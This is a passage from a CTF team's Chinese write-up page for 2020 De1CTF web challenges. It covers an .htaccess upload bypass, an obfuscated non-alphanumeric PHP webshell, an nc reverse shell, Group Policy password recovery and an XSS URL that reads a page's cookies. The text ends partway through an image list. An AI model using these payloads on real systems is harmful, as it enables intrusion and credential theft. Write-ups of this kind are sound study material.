<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>2020 de1ctf writeup | r3kapig</title>
    <meta property="og:title" content="r3kapig writeup" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Writeup for 2020 de1ctf writeup" />
    <meta property="og:description" content="Writeup for 2020 de1ctf writeup" />
    <link rel="canonical" href="https://r3kapig.com/writeup/" />
    <meta property="og:url" content="https://r3kapig.com/writeup/" />
    <meta property="og:site_name" content="r3kapig" />
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="../">
        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">r3kapig / writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
              <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
        
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#check-in">check-in</a>
    
                <a class="dropdown-item" href="#hard_pentest_1">hard_pentest_1</a>
    
                <a class="dropdown-item" href="#animal-crossing">animal-crossing</a>
    
                <a class="dropdown-item" href="#mixture">mixture</a>
    
                <a class="dropdown-item" href="#calc">calc</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#broadcasttest">broadcasttest</a>
    
                <a class="dropdown-item" href="#stl_container">stl_container</a>
    
                <a class="dropdown-item" href="#code_runner">code_runner</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                re
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#parse">parse</a>
    
                <a class="dropdown-item" href="#flw">flw</a>
    
                <a class="dropdown-item" href="#little-elves">little-elves</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                crypto
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#nlfsr">nlfsr</a>
    
                <a class="dropdown-item" href="#ecdh">ecdh</a>
    
                <a class="dropdown-item" href="#homomorphic">homomorphic</a>
    
                <a class="dropdown-item" href="#easyrsa">easyrsa</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#mc_joinin">mc_joinin</a>
    
                <a class="dropdown-item" href="#mc_champion">mc_champion</a>
    
                <a class="dropdown-item" href="#mc_easybgm">mc_easybgm</a>
    
                <a class="dropdown-item" href="#misc-chowder">misc-chowder</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
        <ul class="navbar-nav ml-auto">
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            <a href="#check-in" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">check-in</span>
            </a>
    
<a href="#hard_pentest_1" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">hard_pentest_1</span>
            </a>
    
<a href="#animal-crossing" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">animal-crossing</span>
            </a>
    
<a href="#mixture" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">mixture</span>
            </a>
    
<a href="#calc" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">calc</span>
            </a>
    
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            <a href="#broadcasttest" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">broadcasttest</span>
            </a>
    
<a href="#stl_container" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">stl_container</span>
            </a>
    
<a href="#code_runner" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">code_runner</span>
            </a>
    
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">re</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#parse" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">parse</span>
            </a>
    
<a href="#flw" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">flw</span>
            </a>
    
<a href="#little-elves" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">little-elves</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">crypto</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#nlfsr" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">nlfsr</span>
            </a>
    
<a href="#ecdh" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">ecdh</span>
            </a>
    
<a href="#homomorphic" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">homomorphic</span>
            </a>
    
<a href="#easyrsa" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">easyrsa</span>
            </a>
    
          </div>
    
          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu4" class="collapse sidebar-submenu">
            <a href="#mc_joinin" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">mc_joinin</span>
            </a>
    
<a href="#mc_champion" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">mc_champion</span>
            </a>
    
<a href="#mc_easybgm" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">mc_easybgm</span>
            </a>
    
<a href="#misc-chowder" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">misc-chowder</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="2020-de1ctf-writeup"><a class="header-link" href="#2020-de1ctf-writeup"></a>2020 de1ctf writeup</h1>
<h2 id="web"><a class="header-link" href="#web"></a>web</h2>
<h3 id="check-in"><a class="header-link" href="#check-in"></a>check in</h3>
<p>考察上传绕过，一是在上传<code>.htaccess</code>时对关键字进行绕过，二是在传马时对<code>&lt;?php</code>进行绕过。
构造.htaccess如下：</p>
<pre class="hljs"><code>AddType <span class="hljs-built_in">application</span>/x-httpd-p\
hp .jpg</code></pre><p>将<code>jpg</code>解析为php，绕过关键字过滤上传。
由于是<code>php5.4</code>可以利用<code>&lt;?=</code>替代<code>&lt;?php</code>，上传一句话即可。</p>
<h3 id="hard_pentest_1"><a class="header-link" href="#hard_pentest_1"></a>Hard_pentest_1</h3>
<p class="img-container"><img src="https://i.imgur.com/oO25Nh7.png" alt=""></p>
<p>Burpsuite观察到服务器是Windows，可以用ntfs流绕php后缀<code>shell.php::$DATA</code></p>
<p>shell参考这篇文章：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#\_4">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#\_4</a></p>
<pre class="hljs"><code><span class="hljs-meta">&lt;?</span>=$_=[]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=@<span class="hljs-string">"$_"</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$_[<span class="hljs-string">'!'</span>!=<span class="hljs-string">'@'</span>]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_ = $__[<span class="hljs-string">'!'</span>!=<span class="hljs-string">'@'</span>]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>= =$__=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$___ = $__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$___ .=$__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$___ .= $__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$___.=$__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$___.=$__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$___.=$__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=[]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=@<span class="hljs-string">"$_"</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$_[@<span class="hljs-string">'!'</span>==<span class="hljs-string">'@'</span>]<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$____=<span class="hljs-string">'_'</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$____.=$__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__=$_<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$____.=$__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$____.=$__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$__++<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$____.=$__<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$_=$$____<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>=$___($_[_])<span class="hljs-meta">?&gt;</span></code></pre><p>上传该shell之后，再写入一个普通的shell，即可蚁剑连接，并且上传nc反弹shell。</p>
<p>共享文件里有压缩包需要密码。</p>
<p>同时组策略泄漏了组管理员密码。
<img src="https://i.imgur.com/7CI5tlJ.png" alt=""></p>
<p>解密脚本参考文章：<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p>
<p class="img-container"><img src="https://i.imgur.com/7EpeHuU.png" alt=""></p>
<h3 id="animal-crossing"><a class="header-link" href="#animal-crossing"></a>Animal Crossing</h3>
<p>比赛期间没做出来，结束了突然有点思路了</p>
<p>绕ast+静态。window对象所有方法都能调，同时封锁了属性的调用</p>
<p>open可用，调到子页面直接打opener的资源就能避开父的属性调用了</p>
<pre class="hljs"><code>http:<span class="hljs-regexp">//</span><span class="hljs-number">134.175</span>.<span class="hljs-number">231.113</span>:<span class="hljs-number">8848</span>/passport?image=%2Fstatic%2Fhead.jpg&amp;island=aa&amp;fruit=aa<span class="hljs-string">"&amp;name=url&amp;data=amF2YXNjcmlwdDphbGVydChvcGVuZXIuZG9jdW1lbnQuY29va2llKQ==%27%3b%0aopen(atob(data))%3b%2F%2F</span></code></pre><p class="img-container"><img src="https://i.loli.net/2020/05/08/q6T7nuFHUOYvip2.jpg" alt="-w442"></p>
<p>看到有一半flag肯定后面还有东西。打一下源码，看看hint里的admin行为是想表达个啥</p>
<pre class="hljs"><code>&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_01.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_02.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_03.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_04.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_05.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_06.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_07.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_08.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_09.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_10.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_11.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_12.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_13.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_14.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_15.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_16.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_17.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_18.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_19.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_20.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_21.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_22.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_23.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_24.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_25.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_26.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_27.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
&lt;<span class="hljs-selector-tag">img</span> src=<span class="hljs-string">"/island/test_28.png"</span> class=<span class="hljs-string">"island-img"</span>&gt;
